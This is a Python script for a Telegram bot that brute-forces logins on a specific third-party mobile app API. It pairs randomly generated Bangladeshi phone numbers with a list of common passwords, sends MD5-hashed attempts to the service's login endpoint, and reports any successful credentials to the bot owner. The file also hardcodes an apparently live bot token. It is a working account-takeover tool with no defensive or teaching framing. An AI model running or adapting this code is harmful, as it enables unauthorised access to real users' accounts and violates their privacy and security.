from telegram.ext import Application, CommandHandler, ContextTypes
from telegram import Update
import hashlib
import requests
import random

# 🛡️ Your Telegram bot token and your own Telegram ID
TOKEN = '7974281346:AAG8uXYvqW_khgOnwyCTf2J6k9nm2aSLZ4c'
OWNER_ID = 5509024333  # Replace with your Telegram user ID only

# 📱 Mobile number generation settings
prefixes = ['88016', '88017', '88018', '88019']
used_numbers = set()

# 🔐 Common Bangladeshi-style password list
password_list = [
    '123456', '12345678', '123456789', 'password', 'bangladesh', '112233',
    '123123', '1971', 'bismillah', '786786', 'abcd1234', 'password1', 'admin',
    'welcome', '102030', 'qwerty', '123321', '000000'
]

# 🔁 Generate a unique random mobile number
def get_unique_mobile():
    for _ in range(1000):
        prefix = random.choice(prefixes)
        suffix = random.randint(10000000, 99999999)
        mobile = prefix + str(suffix)
        if mobile not in used_numbers:
            used_numbers.add(mobile)
            return mobile
    return None

# 🟢 Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot ready. Use /brute to begin.")

# 🧪 Brute force login testing
async def brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ You are not authorized.")
        return

    await update.message.reply_text("🚀 Starting brute force...")

    for _ in range(10):  # Limit mobile numbers tested
        mobile = get_unique_mobile()
        if not mobile:
            await update.message.reply_text("🚫 No more unique numbers.")
            break

        for password in password_list:
            hashed = hashlib.md5(password.encode()).hexdigest()
            try:
                response = requests.post("https://app.macvz.com/api/login", json={
                    "mobile": mobile,
                    "login_type": 1,
                    "password": hashed
                }, timeout=5)

                data = response.json()
                msg = data.get("contact") or data.get("msg") or data.get("error", "No response")

                # 📺 Log every attempt to terminal
                print(f"Trying {mobile} - {password} → {msg}")

                if data.get("success"):
                    result_msg = f"✅ SUCCESS:\n📱 {mobile}\n🔑 {password}\n💬 {msg}"
                    
                    # Send success to Telegram
                    await update.message.reply_text(result_msg)

                    # Print success in terminal
                    print(result_msg)
                    return
            except Exception as e:
                err_msg = f"⚠️ Error with {mobile} - {password}: {e}"
                print(err_msg)
                await update.message.reply_text(err_msg)

    await update.message.reply_text("❌ Brute force complete. No hits.")
    print("❌ Brute force complete. No hits.")

# 🚀 Main bot launcher
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("brute", brute))

    print("✅ Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()